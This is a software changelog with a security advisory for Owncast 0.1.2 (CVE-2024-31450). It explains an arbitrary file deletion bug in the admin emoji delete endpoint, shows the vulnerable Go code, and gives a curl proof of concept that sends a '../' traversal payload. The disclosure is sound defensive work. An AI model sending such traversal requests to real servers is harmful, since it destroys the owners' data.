# Changelog

## [[0.1.3](https://github.com/owncast/owncast/milestone/25)] - 2024-04-07

## Upgrade instructions from 0.1.2

1. Stop the service from running. If you're using a pre-installed image through a hosting provider, or setup Owncast to run under systemd you can probably just simply run `systemctl stop owncast`.
2. Change to the directory where Owncast is installed on your server.
3. If you‚Äôve customized your web interface in any way you will want to back up the files you‚Äôve changed or customized.
4. Re-run the installer as the user you run Owncast under. For example if you are running owncast as the user "owncast": `su -c "curl https://owncast.online/install.sh |bash" owncast`
5. Restart the service. If you're running under systemd `systemctl start owncast`.

## Summary

Owncast in version 0.1.2 allows remote attackers with administrator privileges to delete arbitrary files by making a malicious POST request to `/api/admin/emoji/delete`.

## Product

Owncast

## Tested Version

[v0.1.2](https://github.com/owncast/owncast/releases/tag/v0.1.2)

## Details

### Arbitrary file deletion in `emoji.go` (`GHSL-2023-277`)

The Owncast application exposes an administrator API at the URL `/api/admin`. The `emoji/delete` endpoint of said API allows administrators to delete custom emojis, which are saved on disk. As it can be seen in the following snippet, the parameter `name` is taken from the JSON request and directly appended to the filepath that points to the emoji to delete:

[`controllers/admin/emoji.go:63`](https://github.com/owncast/owncast/blob/v0.1.2/controllers/admin/emoji.go#L63)

```
func DeleteCustomEmoji(w http.ResponseWriter, r *http.Request) {
	if !requirePOST(w, r) {
		return
	}

	type deleteEmoji struct {
		Name string `json:"name"`
	}

	emoji := new(deleteEmoji)

	if err := json.NewDecoder(r.Body).Decode(emoji); err != nil {
		// --snip--
	}

	// var emojiFileName = filepath.Base(emoji.Name)
	targetPath := filepath.Join(config.CustomEmojiPath, emoji.Name)

	if err := os.Remove(targetPath); err != nil {
		// --snip--
	}
	// --snip--
}

```

By using path traversal sequences (`../`), attackers with administrative privileges can exploit this endpoint to delete arbitrary files on the system, outside of the emoji directory.

#### Impact

This issue may lead to arbitrary file deletion.

#### Resources

To exploit this vulnerability, an attacker may make the following POST request:

```
curl -X 'POST' \
    -H 'Authorization: Basic <ADMIN_CREDENTIALS>' \
    --data '{"name":"../../../../../../../tmp/test"}' \
    'http://(victim_server):8080/api/admin/emoji/delete'

```

Note that credentials for the `admin` user are needed.

## CVE

* CVE-2024-31450

## Credit

This issue was discovered and reported by the GitHub CodeQL team member [@atorralba (Tony Torralba)](https://github.com/atorralba). The vulnerability was found with the help of CodeQL‚Äôs [path injection query](https://codeql.github.com/codeql-query-help/go/go-path-injection/).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2023-277` in any communication regarding this issue.
